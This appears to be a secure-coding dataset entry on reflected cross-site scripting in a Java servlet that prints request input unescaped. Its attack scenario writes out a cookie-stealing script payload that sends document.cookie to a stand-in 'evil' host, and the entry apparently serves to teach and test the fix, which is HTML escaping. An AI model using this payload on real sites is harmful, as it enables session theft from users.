name: Servlet reflected XSS via response writer
attack_scenario: Attacker lures a victim to /page?q=<script>document.location='//evil/'+document.cookie</script>; the unescaped value is reflected and the script runs in the victim's session.
negative_test_hint: submit q = "<script>alert(1)</script>" and assert the response HTML-escapes the value instead of reflecting it verbatim

exemplar.explanation: Writing request-derived data into the HTTP response via getWriter().print/write with no encoding reflects attacker HTML/JS into the victim's page, a classic reflected XSS. Contextually HTML-escaping user input (HtmlUtils.htmlEscape, OWASP encoder) or rendering through an auto-escaping template turns the markup into inert text.
